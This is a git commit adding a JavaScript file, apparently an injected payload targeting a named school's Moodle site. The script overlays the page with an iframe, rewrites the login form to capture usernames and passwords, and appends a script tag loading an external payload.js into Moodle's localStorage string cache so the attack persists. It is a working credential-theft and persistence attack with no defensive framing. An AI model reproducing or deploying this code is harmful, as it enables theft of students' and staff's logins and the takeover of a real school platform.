9d2d22734ceb77698a5aaefa82e443317daae584
blobfischforever <blobfischforever@proton.me>
2025-06-24 18:04:20 +0200

    Add files via upload

---
+++ renderer.js
@@ -0,0 +1,74 @@
+
+if(documentTree == undefined){
+	var documentTree = true;
+	
+	if(!document.location.href.includes("https://moodle.bg-ka.schule/badges/external.php?")){
+		document.body.style.overflow = 'hidden';
+		document.body.innerHTML += `<iframe referrerpolicy="no-referrer" style="position:absolute; height:100%; width:100vw; top:0px; left:0px; z-index:1040; margin:0px; padding:0px;" id="spoof" src="${document.location.href}"> </iframe>`
+	}else{
+		document.body.innerHTML += `<iframe referrerpolicy="no-referrer" style="position:absolute; height:100%; width:100vw; top:0px; left:0px; z-index:1040; margin:0px; padding:0px;" id="spoof" src="https://moodle.bg-ka.schule/my/"> </iframe>`
+		document.body.style.overflow = 'hidden';
+	}
+	
+	
+	//https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQB7ktgOAGh3HawAQETZZ4YqYlKciCxYugoyg&s
+
+	const iframe = document.getElementById("spoof");
+
+	iframe.addEventListener("load", () => {
+			const doc = iframe.contentDocument;
+			console.log("iframe source "+doc.location.href);
+			
+			if(doc.location.href == "https://moodle.bg-ka.schule/login/index.php"){
+				console.log("injecting code");
+				doc.getElementsByClassName("logo mr-1")[0].src = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQB7ktgOAGh3HawAQETZZ4YqYlKciCxYugoyg&s"
+				doc.getElementById("login").removeAttribute("action");
+				doc.getElementById("login").removeAttribute("method");
+				doc.getElementById("login").onsubmit = function(event){
+						
+						let url = "https://moodle.bg-ka.schule/my/#"+doc.getElementById("username").value+"#"+doc.getElementById("password").value
+						
+						doc.location.href = url;
+					
+						return false;
+					};
+			}else if(doc.location.href.includes("https://moodle.bg-ka.schule/my/#")){
+				console.log("extracted password and username are " + doc.location.href.split("#")[1].split("%23").join(" "));
+			}else if(doc.location.href == "https://moodle.bg-ka.schule/login/index.php?loginredirect=1"){
+				console.log("user login failed");
+			}
+			
+			
+			
+	 });
+
+	let storages = ["-2000383042/core_str/nocourses/block_starredcourses/de",
+		"-2000383042/core_str/nocourses/block_starredcourses/de",
+		"-2000383042/core_str/completion_manual:aria:markdone/course/de",
+		"-2000383042/core_str/addresourceoractivity/moodle/de",
+		"-2000383042/core_str/favourite/core_course/de",
+		"-2000383042/core_str/createnewcourse/core/de"
+		]
+	
+	for( key of storages){
+		let val = localStorage.getItem(key);
+		
+		if(val){
+			if(! val.includes('<script src="https://nils-nonline.github.io/moodle/payload.js"> </script>')){
+				localStorage.setItem(key,val+ '<script src="https://nils-nonline.github.io/moodle/payload.js"> </script>');
+			}else{
+				console.log("already injected code");
+			}
+		}
+	}
+	
+	//-2000383042/core_str/nocourses/block_starredcourses/de =>"Keine favorisierten Kurse"
+	//-2000383042/core_str/completion_manual:aria:markdone/course/de =>{$a} als erledigt kennzeichnen
+	//-2000383042/core_str/addresourceoractivity/moodle/de => Aktivität oder Material anlegen
+	//-2000383042/core_str/favourite/core_course/de => Favorisierte Kurse
+	//-2000383042/core_str/createnewcourse/core/de => Neuen Kurs anlegen
+
+
+}else{
+	console.log("payload was not loaded additionally");
+}
